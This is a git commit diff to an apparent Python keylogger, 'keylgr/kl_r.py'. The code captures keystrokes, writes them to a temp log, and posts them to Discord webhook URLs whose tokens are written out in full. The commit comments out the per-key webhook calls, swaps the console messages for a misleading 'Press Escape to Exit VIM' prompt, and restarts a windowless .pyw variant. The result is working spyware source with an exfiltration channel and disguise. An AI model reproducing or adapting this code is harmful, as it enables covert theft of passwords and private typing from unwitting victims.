fb570a56056641e7716a4b7692094cefb142c307
PVER Programz <91049313+PVER-Programz@users.noreply.github.com>
2022-04-05 19:12:38 +0530

    nonLive

--- keylgr/kl_r.py
+++ keylgr/kl_r.py
@@ -18,17 +18,19 @@ finally:
 def restartAPP():
 	print(os.getcwd())
 	# os.startfile("kl_r.py")
-	os.startfile("kl_r.pyw")
+	os.startfile("kl_d.pyw")
 
 keys = []
 logPATH = os.getenv('TEMP') + '\\log.txt'
-hookURL = 'https://discord.com/api/webhooks/959774283591221268/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm' # LIVE
-escHOOK = 'https://discord.com/api/webhooks/959774361546530886/kzdmKwLRuoZnXEgxm-lwn_50FN9TQ6gJZnRBwO7-V3R47lQYyu36uUJ3-CozqUtf_rSb' # ESC
+
+hookTEMPLATE = 'https://discord.com/api/webhooks/'
+hookURL = hookTEMPLATE + '959774283591221268/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm' # LIVE
+escHOOK = hookTEMPLATE + '959774361546530886/kzdmKwLRuoZnXEgxm-lwn_50FN9TQ6gJZnRBwO7-V3R47lQYyu36uUJ3-CozqUtf_rSb' # ESC
 
 def sendHOOK(letter, uri):
 	bot = {"content": letter,
 			"username": str(int(time.time())),
-			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959780226114650122/unknown.png',
+			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png',
 			"tts": "false"}
 	response = requests.post(uri, json=bot)
 	pass
@@ -39,11 +41,11 @@ def on_press(key):
 	write_file(keys)
 	
 	try:
-		print('alphanumeric key {0} pressed'.format(key.char))
-		sendHOOK(key.char, hookURL)
+		print('Input Detected...'.format(key.char))
+# 		sendHOOK(key.char, hookURL)
 	except AttributeError:
-		print('special key {0} pressed'.format(key))
-		sendHOOK(str(key), hookURL)
+		print('Press Escape to Exit VIM...'.format(key))
+# 		sendHOOK(str(key), hookURL)
 
 	if key == Key.esc or key == Key.enter:
 		# Stop listener
